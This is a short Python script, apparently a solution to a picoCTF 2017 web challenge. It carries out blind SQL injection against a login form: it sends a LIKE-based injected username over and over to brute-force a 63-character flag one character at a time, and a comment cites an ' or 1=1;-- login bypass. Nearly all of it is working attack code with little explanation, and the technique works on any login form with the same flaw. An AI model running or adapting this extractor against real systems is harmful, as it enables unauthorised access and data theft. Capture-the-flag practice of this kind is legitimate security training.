import requests
import sys

''' 
when try to log in by ' or 1=1;-- , it says "flag is 63 characters".
Then we can brute force the flag.
'''

username = "admin' AND pass LIKE '{0}%"
flag = ''
while len(flag) < 63:
    for i in range(32,127):
        if i==37 or i==39:                                                          # skip % and '
            continue
        r = requests.post('http://shell2017.picoctf.com:40788/', data={
            'username': username.format(flag+chr(i)),
            'password': ''
            })
        if r.status_code == 200 and r.text.find('Incorrect Password')>0:            # find a right char in flag
            print('Find one: {0}'.format(chr(i)))
            flag += chr(i)
            break
        if i==126:                                                                  # attemp failed, error
            raise Exception('Attemp failed')

print(flag)
